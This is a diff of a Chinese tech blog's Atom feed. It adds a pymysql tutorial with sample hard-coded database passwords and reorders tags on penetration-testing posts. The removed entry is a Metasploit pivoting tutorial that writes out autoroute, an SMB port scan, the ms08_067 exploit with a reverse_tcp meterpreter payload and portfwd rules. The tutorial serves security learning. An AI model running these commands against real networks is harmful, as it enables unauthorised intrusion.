@@ -111,6 +111,41 @@
   </entry>
   
   <entry>
+    <title>Python编程使用MySQL</title>
+    <link href="http://c.cat.plus/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/"/>
+    <id>http://c.cat.plus/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/</id>
+    <published>2018-03-10T07:59:38.000Z</published>
+    <updated>2020-07-17T10:28:35.318Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="Python数据库编程"><a href="#Python数据库编程" class="headerlink" title="Python数据库编程"></a><strong>Python数据库编程</strong></h4><ul><li>python数据库接口(Python DB-API)<ul><li>为开发人员提供的数据库应用编程接口</li><li>支持的数据库服务软件<ul><li>Mysql, Oracle, SQL_Server, Mongodb…</li></ul></li><li>python提供的操作mysql模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3: pymysql</span><br><span class="line">python2: MySQLdb</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="pymysql模块使用流程"><a href="#pymysql模块使用流程" class="headerlink" title="pymysql模块使用流程"></a><strong>pymysql模块使用流程</strong></h4><ol><li>建立数据库连接<ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul></li><li>创建游标对象</li><li>使用游标对象的方法操作数据库</li><li>提交commit</li><li>关闭游标对象</li><li>关闭数据库连接</li></ol><p><strong>示例</strong> <code>mysql_test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="comment">#1.创建数据库连接对象</span></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"><span class="comment">#2.创建游标对象</span></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"><span class="comment">#3.利用游标对象cursor的方法来操作数据库</span></span><br><span class="line">cursor.execute(<span class="string">"insert into userinfo values(1,200000,'sicuansheng');"</span>)</span><br><span class="line"><span class="comment">#4.提交到数据库commit</span></span><br><span class="line">db.commit()</span><br><span class="line"><span class="comment">#5. 关闭游标对象</span></span><br><span class="line">cursor.close()</span><br><span class="line"><span class="comment">#6.关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>建立数据库连接</strong></p><ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul><p><strong>SQL查询示例</strong> <code>inquiry.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"cat"</span>,<span class="string">"heybeauty"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"></span><br><span class="line">sql_select=<span class="string">"select * from userinfo;"</span></span><br><span class="line">cursor.execute(sql_select)</span><br><span class="line"></span><br><span class="line">data=cursor.fetchone()</span><br><span class="line">print(<span class="string">"fetchone的结果为"</span>,data)</span><br><span class="line"></span><br><span class="line">data2=cursor.fetchmany(<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"fetchmany(2)的结果为"</span>,data2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data2:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">data3=cursor.fetchall()</span><br><span class="line">print(<span class="string">"fetchall()的结果为"</span>,data3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data3:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">db.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>MySQL workbench</strong> </p><ul><li>官方图形化界面管理工具<ul><li><code>https://www.mysql.com/products/workbench/</code></li></ul></li></ul><p><strong>ER模型&amp;ER图</strong></p><ul><li>定义<ul><li>ER模型即 实体 - 关系 模型</li><li>ER图即 实体关系图</li></ul></li><li>三个概念<ul><li>实体</li><li>属性</li><li>关系<ul><li>定义: 实体之间的关系</li><li>分类<ul><li>一对一关系(1:1) # 班级和班长    </li><li>一对多关系(1:n) # 班级和学生</li><li>多对多关系(m:n) # 学生和课程</li></ul></li></ul></li><li>ER图的绘制<ul><li>矩形框代表实体,菱形框代表关系,椭圆形代表属性</li></ul></li></ul></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;Python数据库编程&quot;&gt;&lt;a href=&quot;#Python数据库编程&quot; class=&quot;headerlink&quot; title=&quot;Python数据库编程&quot;&gt;&lt;/a&gt;&lt;strong&gt;Python数据库编程&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;python数据库接口
+      
+    
+    </summary>
+    
+    
+      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
+    
+      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
+    
+      <category term="MySQL" scheme="http://c.cat.plus/categories/DBMS/MySQL/"/>
+    
+    
+      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
+      <category term="mysql" scheme="http://c.cat.plus/tags/mysql/"/>
+    
+      <category term="pymysql" scheme="http://c.cat.plus/tags/pymysql/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Python内建的数值型函数及基本输入输出</title>
     <link href="http://c.cat.plus/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/"/>
     <id>http://c.cat.plus/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</id>
@@ -193,17 +228,17 @@ ro
     
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
-    
-      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
-    
       <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
-      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
+      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
       <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
+      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
+    
+      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
@@ -238,13 +273,13 @@ ro
     
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
+      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
+    
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
       <category term="python" scheme="http://c.cat.plus/tags/python/"/>
     
       <category term="passing-the-hash" scheme="http://c.cat.plus/tags/passing-the-hash/"/>
-    
-      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
     
       <category term="shellter" scheme="http://c.cat.plus/tags/shellter/"/>
     
@@ -279,17 +314,17 @@ ro
     
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
-    
       <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
-      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
-    
-      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
       <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
     
       <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
+    
+      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
+    
+      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
     
       <category term="Veil-evasion" scheme="http://c.cat.plus/tags/Veil-evasion/"/>
     
@@ -321,9 +356,9 @@ ro
     
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
-    
       <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
+      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
       <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
     
@@ -721,44 +756,6 @@ ro
       <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
     
       <category term="迁移进程" scheme="http://c.cat.plus/tags/%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MsF后渗透测试阶段之跳板利用及端口转发</title>
-    <link href="http://c.cat.plus/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
-    <id>http://c.cat.plus/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
-    <published>2016-03-14T14:25:16.000Z</published>
-    <updated>2020-07-07T09:09:06.705Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="Pivoting-跳板-枢纽-支点"><a href="#Pivoting-跳板-枢纽-支点" class="headerlink" title="Pivoting 跳板 / 枢纽 / 支点"></a><strong>Pivoting</strong> 跳板 / 枢纽 / 支点</h4><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其他内网计算机看来访问全部来自于跳板机</li><li><code>run autoroute -s 1.1.1.0/24</code><br>  #不能访问外网的被攻击目标内网网段</li></ul><p><strong>自动路由 现实场景</strong></p><ul><li>利用win 7攻击内网XP(对比xp有无外网访问权的情况)</li><li>扫描内网辅助模块: <code>auxiliary/scanner/portscan/tcp</code></li></ul><pre><code>use auxiliary/scanner/portscan/tcpshow optionsset rhosts 2.1.1.0/24set ports 139,445exploitdb_nmap -sV -p 445 2.1.1.11use exploit/windows/smb/ms08_067_netapishow optionsset rhost 2.1.1.11        #设置目标内网被攻击IPset payload windows/meterpreter/reverse_tcpset lhost 2.1.1.10        #设置反弹连接IP为跳板机set target 34</code></pre><p><strong>Pivoting之端口转发Portfwd</strong></p><ul><li>利用已经被控计算机,在kali与被攻击目标之间实现端口转发</li><li>也需要在已有session的前提下进入meterpreter内使用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L LIP -l LPORT -r RIP -p RPORT#添加端口转发规则</span><br><span class="line">portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</span><br><span class="line">portfwd list #查看已添加列表</span><br><span class="line">portfwd delete#删除某条规则</span><br><span class="line">portfwd flush#删除全部规则</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;Pivoting-跳板-枢纽-支点&quot;&gt;&lt;a href=&quot;#Pivoting-跳板-枢纽-支点&quot; class=&quot;headerlink&quot; title=&quot;Pivoting 跳板 / 枢纽 / 支点&quot;&gt;&lt;/a&gt;&lt;strong&gt;Pivoting&lt;/strong&gt; 跳板 / 
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
-    
-    
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
-      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
-    
-      <category term="跳板机" scheme="http://c.cat.plus/tags/%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
-    
-      <category term="portfwd" scheme="http://c.cat.plus/tags/portfwd/"/>
-    
-      <category term="autoroute" scheme="http://c.cat.plus/tags/autoroute/"/>
     
   </entry>
   
